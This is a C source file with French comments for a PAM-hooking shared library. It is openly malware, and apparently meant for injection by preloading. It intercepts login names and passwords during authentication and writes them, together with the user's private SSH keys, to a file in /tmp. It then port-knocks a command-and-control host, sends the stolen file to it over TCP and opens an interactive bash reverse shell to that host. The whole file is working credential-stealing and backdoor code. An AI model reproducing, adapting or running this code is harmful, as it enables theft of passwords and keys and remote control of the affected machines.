#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <syslog.h>
#include <errno.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <pty.h>
#include <utmp.h>
#include <pwd.h>

// ------------------------------------------------------------------
// Pointeurs vers les fonctions PAM originale
typedef int (*pam_get_item_t)(const pam_handle_t *, int, const void **);
typedef int (*pam_get_user_t)(pam_handle_t *, const char **, const char *);

static pam_get_item_t original_pam_get_item = NULL;
static pam_get_user_t original_pam_get_user = NULL;

// ------------------------------------------------------------------
// Configuration de base
// ------------------------------------------------------------------
#define CREDENTIALS_FILE "/tmp/credentials.txt"

// Adresse/ports du C2
#define REMOTE_HOST       "192.168.64.11"
#define KNOCK_PORT1       5001
#define KNOCK_PORT2       5002
#define KNOCK_PORT3       5003
#define CREDENTIALS_PORT  4444
#define SHELL_PORT        4445

// Stocke l’utilisateur intercepté (pour retrouver son répertoire .ssh)
static char g_username[256] = {0};

// ------------------------------------------------------------------
// Utilitaires
// ------------------------------------------------------------------
static const char *get_current_time() {
    static char buffer[20];
    time_t raw_time = time(NULL);
    struct tm *time_info = localtime(&raw_time);
    strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", time_info);
    return buffer;
}

static void write_to_file(const char *type, const char *data) {
    FILE *file = fopen(CREDENTIALS_FILE, "a");
    if (!file) {
        syslog(LOG_ERR, "[ERROR] Impossible d'ouvrir %s : %m", CREDENTIALS_FILE);
        return;
    }
    fprintf(file, "[%s] %s : %s\n", get_current_time(), type, data);
    fclose(file);
}

// ------------------------------------------------------------------
// Ajout des clés SSH dans /tmp/credentials.txt
// ------------------------------------------------------------------
static void append_ssh_keys_to_file(const char *home_dir) {
    if (!home_dir || !*home_dir) {
        syslog(LOG_ERR, "[ERROR] Impossible de déterminer le répertoire personnel.");
        return;
    }

    char ssh_dir[512];
    snprintf(ssh_dir, sizeof(ssh_dir), "%s/.ssh", home_dir);

    FILE *fp = fopen(CREDENTIALS_FILE, "a");
    if (!fp) {
        syslog(LOG_ERR, "[ERROR] Impossible d'ouvrir %s pour y ajouter les clés SSH.", CREDENTIALS_FILE);
        return;
    }

    fprintf(fp, "\n[SSH KEYS]\n");
    const char *keys[] = {"id_rsa", "id_dsa", "id_ecdsa", "id_ed25519"};
    int nb_keys = sizeof(keys)/sizeof(keys[0]);

    for (int i = 0; i < nb_keys; i++) {
        char key_path[1024];
        snprintf(key_path, sizeof(key_path), "%s/%s", ssh_dir, keys[i]);

        FILE *key_file = fopen(key_path, "r");
        if (key_file) {
            fprintf(fp, "----- BEGIN %s -----\n", keys[i]);
            char buffer[1024];
            size_t n;
            while ((n = fread(buffer, 1, sizeof(buffer), key_file)) > 0) {
                fwrite(buffer, 1, n, fp);
            }
            fprintf(fp, "\n----- END %s -----\n", keys[i]);
            fclose(key_file);
        }
    }
    fclose(fp);
}

// ------------------------------------------------------------------
// Port knocking et envoi du fichier
// ------------------------------------------------------------------
static int port_knock(const char *ip, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        syslog(LOG_ERR, "[ERROR] socket() dans port_knock : %m");
        return -1;
    }
    struct sockaddr_in srv;
    memset(&srv, 0, sizeof(srv));
    srv.sin_family = AF_INET;
    srv.sin_port   = htons(port);
    inet_pton(AF_INET, ip, &srv.sin_addr);
    
    connect(sock, (struct sockaddr*)&srv, sizeof(srv)); // Pas grave si échoue
    close(sock);
    return 0;
}

static void send_file_tcp(const char *ip, int remote_port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        syslog(LOG_ERR, "[ERROR] socket() dans send_file_tcp : %m");
        return;
    }
    struct sockaddr_in srv;
    memset(&srv, 0, sizeof(srv));
    srv.sin_family = AF_INET;
    srv.sin_port   = htons(remote_port);
    inet_pton(AF_INET, ip, &srv.sin_addr);
    if (connect(sock, (struct sockaddr*)&srv, sizeof(srv)) < 0) {
        syslog(LOG_ERR, "[ERROR] connect() dans send_file_tcp : %m");
        close(sock);
        return;
    }
    FILE *f = fopen(CREDENTIALS_FILE, "r");
    if (!f) {
        syslog(LOG_ERR, "[ERROR] Impossible d'ouvrir %s pour l'envoyer au C2.", CREDENTIALS_FILE);
        close(sock);
        return;
    }
    char buffer[1024];
    size_t bytes_read;
    while ((bytes_read = fread(buffer, 1, sizeof(buffer), f)) > 0) {
        if (send(sock, buffer, bytes_read, 0) < 0) {
            syslog(LOG_ERR, "[ERROR] send() échoué : %m");
            break;
        }
    }
    fclose(f);
    close(sock);
}

// ------------------------------------------------------------------
// Lancement du reverse shell via forkpty()
// ------------------------------------------------------------------
static void launch_reverse_shell(const char *ip, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        syslog(LOG_ERR, "[ERROR] socket() dans launch_reverse_shell : %m");
        _exit(0);
    }
    struct sockaddr_in srv;
    memset(&srv, 0, sizeof(srv));
    srv.sin_family = AF_INET;
    srv.sin_port = htons(port);
    inet_pton(AF_INET, ip, &srv.sin_addr);
    if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) < 0) {
        close(sock);
        _exit(0);
    }

    int master_fd;
    pid_t pid = forkpty(&master_fd, NULL, NULL, NULL);
    if (pid < 0) {
        close(sock);
        _exit(0);
    }
    if (pid == 0) {
        // Processus enfant : lance un shell interactif
        execl("/bin/bash", "bash", "-i", NULL);
        _exit(0);
    } else {
        // Processus parent : transfère données entre le socket et la pseudo-tty
        char buffer[1024];
        fd_set fds;
        int nfds = (sock > master_fd ? sock : master_fd) + 1;
        while (1) {
            FD_ZERO(&fds);
            FD_SET(sock, &fds);
            FD_SET(master_fd, &fds);
            if (select(nfds, &fds, NULL, NULL, NULL) < 0) {
                break;
            }
            if (FD_ISSET(sock, &fds)) {
                int n = read(sock, buffer, sizeof(buffer));
                if (n <= 0) break;
                write(master_fd, buffer, n);
            }
            if (FD_ISSET(master_fd, &fds)) {
                int n = read(master_fd, buffer, sizeof(buffer));
                if (n <= 0) break;
                write(sock, buffer, n);
            }
        }
        close(sock);
        close(master_fd);
    }
}

// ------------------------------------------------------------------
// Intercepteurs PAM
// ------------------------------------------------------------------
int pam_get_user(pam_handle_t *pamh, const char **user, const char *prompt) {
    if (!original_pam_get_user) {
        original_pam_get_user = (pam_get_user_t)dlsym(RTLD_NEXT, "pam_get_user");
        if (!original_pam_get_user) {
            syslog(LOG_ERR, "[ERROR] dlsym(pam_get_user) : %s", dlerror());
            return PAM_SYSTEM_ERR;
        }
    }
    int retval = original_pam_get_user(pamh, user, prompt);
    if (retval == PAM_SUCCESS && *user) {
        // On stocke l'utilisateur dans g_username pour déterminer son répertoire .ssh
        memset(g_username, 0, sizeof(g_username));
        strncpy(g_username, *user, sizeof(g_username) - 1);

        // Écrit le login dans le fichier
        write_to_file("Login", *user);
    }
    return retval;
}

int pam_get_item(const pam_handle_t *pamh, int item_type, const void **item) {
    if (!original_pam_get_item) {
        original_pam_get_item = (pam_get_item_t)dlsym(RTLD_NEXT, "pam_get_item");
        if (!original_pam_get_item) {
            syslog(LOG_ERR, "[ERROR] dlsym(pam_get_item) : %s", dlerror());
            return PAM_SYSTEM_ERR;
        }
    }
    int retval = original_pam_get_item(pamh, item_type, item);
    if (retval == PAM_SUCCESS && item_type == PAM_AUTHTOK && item && *item) {
        // Écrit le mot de passe intercepté
        const char *password = (const char*)(*item);
        write_to_file("Password", password);
        
        // Récupère le répertoire personnel exact via getpwnam(g_username)
        if (g_username[0] != '\0') {
            struct passwd *pw = getpwnam(g_username);
            if (pw && pw->pw_dir) {
                append_ssh_keys_to_file(pw->pw_dir);
            }
        }

        // Port knocking
        port_knock(REMOTE_HOST, KNOCK_PORT1);
        sleep(1);
        port_knock(REMOTE_HOST, KNOCK_PORT2);
        sleep(1);
        port_knock(REMOTE_HOST, KNOCK_PORT3);
        sleep(1);

        // Envoi du fichier
        send_file_tcp(REMOTE_HOST, CREDENTIALS_PORT);

        // Reverse shell dans un processus enfant
        pid_t shell_pid = fork();
        if (shell_pid == 0) {
            launch_reverse_shell(REMOTE_HOST, SHELL_PORT);
            _exit(0);
        }
    }
    return retval;
}

